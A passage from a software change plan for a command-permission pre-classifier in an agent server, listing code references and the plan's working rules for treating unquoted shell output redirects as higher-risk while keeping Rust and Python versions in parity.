- `mika/crates/mika-agent/src/server/permission_pre_classifier.rs:158-176` — `contains_unquoted_metacharacter()` docstring (target of Change 1.4).
- `mika/crates/mika-agent/src/server/permission_pre_classifier.rs:177-231` — scanner body (target of Change 1.1).
- `mika/crates/mika-agent/src/server/permission_pre_classifier.rs:218-220` — existing `>(` check (folded into consolidated `>` arm).
- `mika/crates/mika-agent/src/server/permission_pre_classifier.rs:657-663` — `test_pipe_to_tail` (positive-test contract anchor).
- `claude-pilot-py/src/claude_pilot/tier1.py:70-92` — TIER3_PATTERNS tuple (target of Change 3.1).
- `claude-pilot-py/src/claude_pilot/tier1.py:91` — current output-redirect regex (replaced).
- mika commit `7a233603` — `fix(server): reject unquoted process substitution …` (sibling mika#942, landed); the file-shape baseline for Phase 0 pin.
- mika commit `3a39bd31` (this plan's `base_sha`) — `main` HEAD at grooming time.

## Discipline this plan embodies

- **Slug-immutable per mika#844.** Branch `fix/943/server-output-redirect-not-in-rust-tier3` derived from the title's `fix(server):` prefix. Plan filename uses semantic shape `fix-943-pre-classifier-output-redirect`; the branch slug carries label-derived type, the plan filename carries the actual focus. No `git branch -m`.
- **Phase 0 pin against `base_sha`.** All line numbers cited from `3a39bd31`. If the file shape drifts before this lands, the plan is re-pinned at second-pass review, not silently rebased.
- **Carve-out instead of blanket reject.** Existing positive workflow (`2>&1 | tail`) is preserved by deliberate design, not by accident. Trade-off documented in §D1.
- **Companion Python change is part of the contract.** Parity is enforced at PR time (cross-language smoke matrix in §Phase 4), not deferred to a follow-up.
- **Scope guardrails.** `tee /path`, `<>`, and the sentinel-drift cleanup are explicitly NOT in scope. Each has a one-line note in §Out of scope so they don't silently inflate the diff.
